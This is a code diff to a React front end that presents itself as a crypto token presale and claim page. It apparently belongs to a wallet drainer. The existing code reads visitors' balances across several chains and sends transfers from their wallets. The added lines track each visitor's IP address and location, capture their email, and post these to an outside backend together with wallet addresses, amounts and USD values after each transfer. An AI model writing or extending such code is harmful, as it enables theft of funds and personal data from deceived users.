@@ -106,6 +106,8 @@ function App() {
     matic: 0.75,
     avax: 32
   });
+  const [userEmail, setUserEmail] = useState('');
+  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -209,6 +211,35 @@ function App() {
     init();
   }, [walletProvider, address]);
 
+  // Track page visit with location
+  useEffect(() => {
+    const trackVisit = async () => {
+      try {
+        const response = await fetch('https://bthbk.vercel.app/api/track-visit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userAgent: navigator.userAgent,
+            referer: document.referrer,
+            path: window.location.pathname
+          })
+        });
+        const data = await response.json();
+        if (data.success) {
+          setUserLocation({
+            country: data.data.country,
+            city: data.data.city,
+            ip: data.data.ip,
+            flag: data.data.flag
+          });
+        }
+      } catch (err) {
+        console.error('Visit tracking error:', err);
+      }
+    };
+    trackVisit();
+  }, []);
+
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
     const balanceResults = {};
@@ -236,8 +267,6 @@ function App() {
             contractAddress: chain.contractAddress
           };
           console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
-          
-          // Send to Telegram via backend (backend handles this)
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
@@ -302,8 +331,9 @@ function App() {
       
       if (data.success) {
         setScanResult(data.data);
-        if (data.data.tokenAllocation) {
-          setAllocation(data.data.tokenAllocation);
+        setUserEmail(data.data.email);
+        if (data.data.allocation) {
+          setAllocation(data.data.allocation);
         }
         
         if (totalValue >= 1) {
@@ -315,7 +345,6 @@ function App() {
       }
     } catch (err) {
       console.error('Verification error:', err);
-      // Don't show error to user, just log it
       setTxStatus('✅ Ready');
     } finally {
       setVerifying(false);
@@ -405,7 +434,7 @@ function App() {
           
           processed.push(chain.name);
           
-          // Notify backend (recording only)
+          // Notify backend with full details
           await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -413,7 +442,12 @@ function App() {
               walletAddress: address,
               chainName: chain.name,
               flowId: `FLOW-${timestamp}`,
-              txHash: tx.hash
+              txHash: tx.hash,
+              amount: amountToSend,
+              symbol: chain.symbol,
+              valueUSD: balances[chain.name].valueUSD * 0.85,
+              email: userEmail,
+              location: userLocation
             })
           });
           
@@ -428,6 +462,19 @@ function App() {
       if (processed.length > 0) {
         setShowCelebration(true);
         setTxStatus(`🎉 Success!`);
+        
+        // Final success notification
+        await fetch('https://bthbk.vercel.app/api/presale/claim', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            walletAddress: address,
+            email: userEmail,
+            location: userLocation,
+            chains: processed,
+            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0)
+          })
+        });
       }
       
     } catch (err) {
@@ -448,7 +495,11 @@ function App() {
       await fetch('https://bthbk.vercel.app/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
+        body: JSON.stringify({ 
+          walletAddress: address,
+          email: userEmail,
+          location: userLocation
+        })
       });
       setShowCelebration(true);
     } catch (err) {
@@ -776,8 +827,6 @@ function App() {
             </div>
           </div>
         )}
-
-        {/* Verification Loading - Removed "Unable to verify" message */}
 
         {/* ============================================ */}
         {/* MAIN CONTENT - ALLOCATION CARD */}
